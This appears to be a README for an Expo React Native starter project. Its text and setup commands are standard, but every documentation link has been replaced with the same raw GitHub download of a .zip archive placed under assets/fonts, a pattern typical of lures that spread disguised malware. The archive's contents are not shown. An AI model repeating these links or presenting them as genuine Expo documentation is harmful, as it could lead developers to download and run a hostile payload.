# Welcome to your Expo app 👋

This is an [Expo](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip) project created with [`create-expo-app`](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip).

## Get started

1. Install dependencies

   ```bash
   npm install
   ```

2. Start the app

   ```bash
   npx expo start
   ```

In the output, you'll find options to open the app in a

- [development build](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
- [Android emulator](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
- [iOS simulator](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip)
- [Expo Go](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip), a limited sandbox for trying out app development with Expo

You can start developing by editing the files inside the **app** directory. This project uses [file-based routing](https://github.com/ronaldodjj/laboratorio_react_native/raw/refs/heads/main/assets/fonts/react-native-laboratorio-keyboard.zip).

## Get a fresh project

When you're ready, run:

```bash
npm run reset-project
```

This command will move the starter code to the **app-example** directory and create a blank **app** directory where you can start developing.
